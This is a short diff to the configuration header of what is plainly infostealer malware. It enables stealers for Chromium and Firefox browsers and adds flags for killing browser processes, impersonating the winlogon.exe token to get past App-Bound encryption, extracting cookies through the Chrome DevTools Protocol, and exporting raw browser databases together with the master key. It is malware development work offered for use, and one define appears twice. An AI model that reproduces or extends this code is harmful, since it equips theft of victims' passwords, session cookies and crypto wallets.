@@ -29,6 +29,11 @@ static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
 
 #define ENABLE_CHROMIUM_STEALER     /* 58 Chromium: Chrome, Edge, Brave, Opera, ... */
 #define ENABLE_FIREFOX_STEALER      /* 10 Gecko: Firefox, Waterfox, Pale Moon, ... */
+#define ENABLE_KILL_BROWSERS        /* Kill browser processes before file access */
+#define ENABLE_KILL_BROWSERS        /* Kill browser processes before file access */
+#define ENABLE_ELEVATOR_IMPERSONATION /* winlogon.exe token impersonation for App-Bound */
+#define ENABLE_CDP_GRABBER          /* Chrome DevTools Protocol cookie extraction */
+#define ENABLE_RAW_EXPORT           /* Export raw browser DB files + master key */
 
 /* ═══════ Wallets ═══════════════════════════════════════════════ */
 
